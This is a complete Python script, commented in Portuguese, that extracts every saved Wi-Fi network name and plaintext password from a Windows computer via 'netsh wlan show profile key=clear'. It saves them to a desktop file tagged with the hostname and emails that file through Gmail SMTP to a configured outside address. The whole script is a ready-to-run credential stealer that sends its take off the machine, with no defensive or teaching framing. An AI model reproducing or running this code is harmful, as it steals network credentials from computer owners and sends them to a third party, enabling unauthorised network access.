import subprocess
import re
import os
from datetime import datetime
import smtplib
from email.message import EmailMessage

# Configurações do e-mail SMTP - ajuste aqui
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USER = "seu.email@gmail.com"
SMTP_PASS = "sua_senha_de_app_ou_senha"

FROM_EMAIL = SMTP_USER
TO_EMAIL = "destinatario@exemplo.com"

# Pasta onde salva o relatório
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
hostname = os.getenv("COMPUTERNAME")
output_file = os.path.join(desktop, f"wifi_passwords_{hostname}_{timestamp}.txt")

def get_profiles():
    results = subprocess.check_output(["netsh", "wlan", "show", "profiles"], shell=True).decode(errors="ignore")
    profiles = re.findall(r"All User Profile\s*:\s*(.*)", results)
    if not profiles:
        profiles = re.findall(r"Perfil Todos os Usuários\s*:\s*(.*)", results)
    return [p.strip() for p in profiles]

def get_password(profile):
    try:
        results = subprocess.check_output(
            ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
            shell=True
        ).decode(errors="ignore")

        pwd_match = re.search(r"Key Content\s*:\s*(.*)", results)
        if not pwd_match:
            pwd_match = re.search(r"Conteúdo da Chave\s*:\s*(.*)", results)

        if pwd_match:
            return pwd_match.group(1).strip()
        else:
            return "<não encontrado ou protegido>"
    except subprocess.CalledProcessError:
        return "<erro ao obter senha>"

def create_report():
    profiles = get_profiles()
    if not profiles:
        print("Nenhum perfil Wi-Fi encontrado.")
        return None

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(f"Relatório de Senhas Wi-Fi - {hostname} - {datetime.now()}\n\n")
        for p in profiles:
            password = get_password(p)
            f.write(f"SSID: {p}\nSenha: {password}\n{'-'*30}\n")

    print(f"Relatório salvo em: {output_file}")
    return output_file

def send_email_smtp(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()

    msg = EmailMessage()
    msg["From"] = FROM_EMAIL
    msg["To"] = TO_EMAIL
    msg["Subject"] = f"Wi-Fi passwords - {hostname} - {datetime.now().strftime('%Y-%m-%d')}"
    msg.set_content("Segue em anexo o relatório de perfis Wi-Fi e senhas deste computador.")

    # Anexo do arquivo
    with open(file_path, "rb") as f:
        file_data = f.read()
        file_name = os.path.basename(file_path)

    msg.add_attachment(file_data, maintype="text", subtype="plain", filename=file_name)

    # Envia via SMTP
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        print("E-mail enviado com sucesso via SMTP!")
    except Exception as e:
        print(f"Erro ao enviar e-mail via SMTP: {e}")

if __name__ == "__main__":
    report = create_report()
    if report:
        send_email_smtp(report)

#NXMS Since 2025